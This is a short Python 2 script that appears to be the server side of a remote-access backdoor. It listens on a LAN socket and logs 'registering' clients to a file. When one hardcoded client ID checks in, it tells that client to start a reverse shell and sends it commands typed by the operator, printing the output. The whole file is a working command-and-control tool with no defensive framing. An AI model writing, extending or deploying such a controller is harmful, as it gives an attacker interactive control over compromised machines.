import json
import os
import datetime
from time import sleep
import socket
import hashlib

def register_client(conn, data, data_processed):
	print("[i] Registering new client.. %s" % data_processed["client_hashed_id"])
	clients_file = open("clients.txt", "a")
	clients_file.write(str(data))
	clients_file.close()
	print("[S] Client successfully registered.")
	conn.send("OK")

def open_shell_interpreter(conn):
	cmd = ""
	while True:
		cmd = raw_input("> ")
		if cmd == "exit":
			conn.send(cmd)
			break
		else:
			try:
				conn.send(cmd)
				print(conn.recv(1024))
			except:
				break

def check_client_action(conn, data, data_processed):
	print("[i] %s is checking for actions.." % data_processed['client_hashed_id'])
	action = "NONE"
	if data_processed['client_hashed_id'] == "ffc2e2de561ac8ad95b81d9b34886e21":
		action = "reverse_shell"
	if action == "reverse_shell":
		conn.send("reverse_shell")
		open_shell_interpreter(conn)


def initializeListener():
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.bind(('192.168.2.169', 3344))
		s.listen(10)
		while True:
			conn, addr = s.accept()
			print('[i] New connection from %s %s' % (addr[0], addr[1]))
			while True:
			    data = conn.recv(1024)
			    if not data:
			    	break
			    data_processed = json.loads(str(data))
			    if(data_processed["action"]) == "register":
			    	register_client(conn, data, data_processed)
			    if(data_processed["action"]) == "checkAction":
			    	check_client_action(conn, data, data_processed)
			conn.close()
			print("[i] Client disconnected.\n")

	except KeyboardInterrupt:
		s.close()
	except:
		s.close()
		raise

initializeListener()